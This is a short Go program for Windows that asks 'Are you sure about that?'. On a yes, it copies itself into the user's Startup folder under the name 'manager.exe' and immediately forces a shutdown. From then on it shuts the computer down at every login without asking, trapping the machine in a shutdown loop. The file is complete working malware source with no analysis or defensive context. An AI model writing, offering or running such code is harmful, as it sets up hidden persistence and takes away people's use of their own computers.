package main

import (
	"os"
	"os/exec"
	"strings"

	"github.com/Tobotobo/msgbox"
)

func main() {


	current_exe_path := os.Args[0]
	if strings.Contains(current_exe_path, `Programs\Startup`) {
		StartShutdown()
	} else {

		dialog := msgbox.YesNo().Show("Are you sure about that?")
		if dialog.Result.IsYes() {
			SetRunAtStartup(current_exe_path)
			StartShutdown()
		} else {
			os.Exit(0)
		}

	}

}

func SetRunAtStartup(current_exe_path string) {
	exe_file_data, _ := os.ReadFile(current_exe_path)

	roaming_path := os.Getenv("APPDATA")                                            
	startup_path := roaming_path + `\Microsoft\Windows\Start Menu\Programs\Startup` 
	startup_exe_path := startup_path + `\manager.exe`                             

	os.WriteFile(startup_exe_path, exe_file_data, 0666)
}

func StartShutdown() {
	exec.Command("shutdown", "/s", "/t", "0").Start()
}
